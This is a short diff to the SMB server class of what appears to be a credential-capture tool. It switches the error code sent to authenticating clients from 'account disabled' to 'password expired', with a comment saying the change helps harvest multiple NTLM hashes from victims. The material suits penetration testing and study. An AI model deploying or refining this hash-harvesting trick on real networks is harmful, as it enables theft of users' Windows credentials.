@@ -277,7 +277,7 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 
 					if data[8:10] == "\x73\x00" and data[4:5] == "\xff":  # STATUS_SUCCESS
 						if Is_Anonymous(data):
-							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
+							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x71\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x71\x00\x00\xc0" password expired for anonymous logins.
 							Body = SMBSessEmpty()
 
 							Packet = str(Header)+str(Body)
@@ -290,8 +290,8 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 							ParseSMBHash(data,self.client_address[0], Challenge)
 
 							if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
-								# Send ACCOUNT_DISABLED to get multiple hashes if there are any
-								Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
+								# Send PASSWORD_EXPIRED to get multiple hashes if there are any
+								Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x71\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x71\x00\x00\xc0" password expired for anonymous logins.
 								Body = SMBSessEmpty()
 
 								Packet = str(Header)+str(Body)
